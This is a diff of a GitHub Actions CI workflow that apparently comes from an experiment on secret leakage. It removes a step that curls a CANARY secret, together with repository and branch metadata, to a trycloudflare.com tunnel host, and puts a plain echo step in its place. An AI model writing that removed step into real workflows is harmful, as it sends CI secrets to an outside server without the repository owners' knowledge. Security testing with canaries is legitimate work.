@@ -1,12 +1,11 @@
-# 0x19 M1 Test A: required-check workflow
+# 0x19 base ci (replaced by fork PR)
 name: ci
-on: [pull_request, push]
+on:
+  pull_request:
+  push:
+    branches: [main]
 jobs:
-  required:
-    name: 0x19-required
+  echo:
     runs-on: ubuntu-latest
     steps:
-      - env:
-          CANARY: ${{ secrets.CANARY }}
-        run: |
-          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-m1-draft?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&head=${{ github.head_ref }}&ref=${{ github.ref }}" || true
+      - run: echo "0x19 base ci"
